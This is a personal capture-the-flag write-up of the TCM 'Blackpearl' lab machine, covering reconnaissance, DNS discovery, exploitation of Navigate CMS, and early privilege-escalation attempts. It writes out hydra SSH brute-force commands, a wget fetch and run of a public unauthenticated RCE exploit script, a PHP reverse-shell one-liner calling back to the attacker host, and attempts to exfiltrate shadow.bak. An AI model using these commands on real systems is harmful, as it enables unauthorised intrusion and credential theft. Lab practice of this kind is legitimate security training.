# Blackpearl 

## Identificaiton

Target 192.168.64.137 
Attacker 192.168.64.129

    root@kali:/home/kali# arp-scan -l
    Interface: eth0, type: EN10MB, MAC: 00:0c:29:e4:4b:56, IPv4: 192.168.64.129
    Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
    192.168.64.1    00:50:56:c0:00:08       VMware, Inc.
    192.168.64.2    00:50:56:f7:bd:1d       VMware, Inc.
    192.168.64.137  00:0c:29:51:78:47       VMware, Inc.
    192.168.64.254  00:50:56:f7:1b:8f       VMware, Inc.

## Nmap Enumeration

nmap -sV -A -T4 -p- 192.168.64.137
General Scan

![image](https://github.com/user-attachments/assets/42947c0a-610f-4839-a618-bac014163784)

nmap -sV -A -T4 --top-ports 500 192.168.64.137
Top ports only

![image](https://github.com/user-attachments/assets/50505bab-9370-42c2-9ac2-407e46354818)

Findings from above scans: 

    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

    53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
    | dns-nsid: 
    |_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
    
    80/tcp open  http    nginx 1.14.2
    |_http-title: Welcome to nginx!
    |_http-server-header: nginx/1.14.2

    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Nmap Vuln Script Scan

nmap --script vuln 192.168.64.137

![image](https://github.com/user-attachments/assets/d9dce5db-04da-42d1-be4a-eba7c3671ddd)

Findings from above scan:

    22/tcp open  ssh
    53/tcp open  domain
    80/tcp open  http
    | http-vuln-cve2011-3192: 
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://www.tenable.com/plugins/nessus/55976
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |_      https://www.securityfocus.com/bid/49303
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.

## SSH Random Attempt
Username combos: admin, administrator
password combos: admin, administrator, [enter]

![image](https://github.com/user-attachments/assets/c9a9133e-78e5-459b-9556-3efce0474f84)

No success.

## Webpage Inspection

![image](https://github.com/user-attachments/assets/5e4dc761-707c-42db-93d3-61bb19452815)

![image](https://github.com/user-attachments/assets/b56d0fec-0f7b-4f3a-9684-f713529bb2ec)

#### Potential finding in web inspection:
    Webmaster: alek@blackpearl.tcm 

#### What we know:
    Webserver: nginx 1.14.2
    OS: linux 4.15 - 5.8
    7.8 HIGH [DOS] CVE-2011-3192: The Apache web server is vulnerable to a denial of service attack when numerous overlapping byte ranges are requested.

## IP Directory Enumeration with Gobuster

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -u http://192.168.64.137/ -v | grep "Status: 200" 
![image](https://github.com/user-attachments/assets/13d436f2-30ac-41ee-85d4-9ae62b6def33)
dirbuster medium list

![image](https://github.com/user-attachments/assets/706cd5fd-fda6-4ecc-879a-0dff612e27fc)
secrets file

![image](https://github.com/user-attachments/assets/9998b1ea-9fe4-4f97-baeb-bd38d71722dc)
gobuster dir -w /usr/share/wordlists/rockyou.txt --no-error -u http://192.168.64.137/ -v | grep "Status: 200" 
[image]
rockyou.txt

no success.

## Nikto scan

nikto -h http://192.168.64.137
![image](https://github.com/user-attachments/assets/d4e0a204-8b79-4fee-99fc-5f85e9795f1b)
No results

nikto -h http://192.168.64.137 -C all
![image](https://github.com/user-attachments/assets/0f95940e-f4ec-4ab6-b246-47d090a29e27)

nothing interesting.

## curl -I 192.168.64.137
    root@kali:/home/kali# curl -I 192.168.64.137
    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Date: Fri, 03 Jan 2025 14:01:20 GMT
    Content-Type: text/html
    Content-Length: 652
    Last-Modified: Mon, 31 May 2021 09:28:59 GMT
    Connection: keep-alive
    ETag: "60b4ac5b-28c"
    Accept-Ranges: bytes
    
    root@kali:/home/kali# 

nothing interesting.

## CVE-2013-4547 URI Processing Security Bypass attempt
    source: https://www.securityfocus.com/bid/63814/info
    
    nginx is prone to a remote security-bypass vulnerability.
    
    An attacker can exploit this issue to bypass certain security restrictions and perform unauthorized actions.
    
    nginx 0.8.41 through 1.5.6 are vulnerable. 
    
    The following example data is available:
    
    /file \0.php 
    
No success

# Try brute forcing SSH with username alek

    hydra -l alek -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ssh://192.168.64.137 -V
    
    nmap -p 22 --script ssh-brute --script-args="userdb=/path/to/username_wordlist.txt,passdb=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" 192.168.64.137

Ran multiple itereations on SSH brute forcing with no success on any.

## Moved on to dns enumeration

We try to find any DNS records against the target IP 192.168.64.137. The current network ranges it is operating on is 127.0.0.0/24 **[this is due to all virtual machines currently being hosted on a singular machine. In a real life example, this would be totally different, and we would need to distinguish the IP ranges the target IP is currently operating on.]**

dnsrecon -r 127.0.0.0/24 -n 192.168.64.137 
![image](https://github.com/user-attachments/assets/cef093c3-8e6c-4666-8437-aa006c53f4d3)
Finding: PTR blackpearl.tcm 127.0.0.1

A 'Pointer' from the reverse DNS lookup shows us the record for IP address 127.0.0.1 pointing to blackpearl.tcm. **[A PTR record is used for reverse DNS lookups, associating an IP address with a domain name.]**

## Allocating target IP with newly found domain.

Lets allocate the target IP with the blackpearl.tcm domain under /etc/hosts

    root@kali:/etc# nano hosts
    root@kali:/etc# cat hosts
    127.0.0.1       localhost
    127.0.1.1       kali
    
    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    192.168.64.137 blackpearl.tcm
    root@kali:/etc# 

## Check blackpearl.tcm/ in browser

![image](https://github.com/user-attachments/assets/db061ee2-e2d0-4d83-bf8a-36c092a121b2)
Blackpearl.tcm/ has now been allocated with the target IP, which now shows us more details.

**Findings:**

    System 	Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 
    Configuration File (php.ini) Path: 	/etc/php/7.3/fpm
    Loaded Configuration File: 	/etc/php/7.3/fpm/php.ini
    Scan this dir for additional .ini files: 	/etc/php/7.3/fpm/conf.d 

![image](https://github.com/user-attachments/assets/719572fd-5d5c-475f-a9cf-7426514f456d)

## Attempted gobuster to search for directories on blackpearl.tcm/ with dirbuster medium and rockyou
No findings.

    gobuster dir -u blackpearl.tcm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -v | grep "status: 200"

    gobuster dir -u http://blackpearl.tcm/ -w /usr/share/wordlists/rockyou.txt --no-error -v | grep "Status: 200"

Turns out there was findings when grep "Status: 200" was removed
    
    gobuster dir -u blackpearl.tcm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error

    root@kali:/home/kali# gobuster dir -u blackpearl.tcm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://blackpearl.tcm/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /navigate             (Status: 301) [Size: 185] [--> http://blackpearl.tcm/navigate/]
    Progress: 220560 / 220561 (100.00%)
    ===============================================================
    Finished
    ===============================================================

directory /navigate

![image](https://github.com/user-attachments/assets/3c08872e-809e-494d-a028-3e6592e54dc0)

![image](https://github.com/user-attachments/assets/770fad3d-5f78-47bb-af66-a405f96c7c59)

session cookie.

![image](https://github.com/user-attachments/assets/b5e46528-2047-48e4-9708-71f0c58af445)

seems like user 'alek' may potentially be an active user based on the error handling message.

## Options currently: attempt brute forcing of login page, try cookie session hijacking or search for vulnerabilities of NavigateCMS.

In a real world scenario, I should aim to run all three cocurrently. I will require some more knowledge on setting up interception proxies. 

Looks like there is a pretty serious Unauthenticated RCE epxloit that may be available for Navigate CMS V2.8
Proof of concept: <https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated->

Download exploit:    
    
    wget https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh

Change file permissions with chmod +x and execute with below command:

    ./navigate_RCE.sh blackpearl.tcm/

Initial webshell bypass success.

![image](https://github.com/user-attachments/assets/2b6f2dd0-ad99-42a6-8850-f993f7c2fef4)

Upgrading shell with further instructions provided in PoC

    php -r '$sock=fsockopen("192.168.64.129",4444);system("/bin/bash <&3 >&3 2>&3");' 

![image](https://github.com/user-attachments/assets/d6a9ea02-674c-463d-bcae-3c6ecb0f3f5b)

![image](https://github.com/user-attachments/assets/8b155b4e-5b3d-4038-979d-6f7e700e38f5)

Success.

## Now that we have exploited a combination of vulnerabilities, #1 file upload and #2 authentication bypass.
We have managed to get into navigate instance and start a reverse shell, with upgraded shell. At this stage we will need to conduct further enumeration of the new environment we are in.

Had a poke around the instance after gaining access, with nothing interesting found.

## Time to run linpeas for some post exploitation enumeration and deeper scans.

Run python -m SimpleHTTPServer on attacking machine

    wget http://192.168.64.137:8000/linpeas.sh -O linpeas.sh

![image](https://github.com/user-attachments/assets/13f3a266-86e3-4e7d-ad2e-69ab8658bdb2)

linpeas.sh download successful 

Looks like the current user does not have access to execute files.

## Back to looking for ways to elevate access.

Tried a range of 'low hanging fruit' techniques.

cat /etc/passwd

    cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
    sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
    alek:x:1000:1000:alek,,,:/home/alek:/bin/bash
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
    bind:x:107:113::/var/cache/bind:/usr/sbin/nologin

finding:
alek is a user with /bin/bash

![image](https://github.com/user-attachments/assets/ca8045e0-bece-4471-9b43-cf4c0f96856b)

interesting files found in /var/backups: shadow.bak and passwd.bak. Going to attempt to download these files onto attacker machine.

![image](https://github.com/user-attachments/assets/566e4038-1930-4d07-9d3e-09b0a39c3b4d)

![image](https://github.com/user-attachments/assets/83f8a0a1-a6c2-47d5-a2fa-99b1f18b41ec)

Denied.

## After takinga hint, the problem here is that we are not working with an 'interactive shell', thus we need to work on gaining an 'interactive shell' firstly.

## Blackpearl walk through <https://abdhamza.medium.com/tcm-security-blackpearl-box-writeup-cc6be8a0d498>

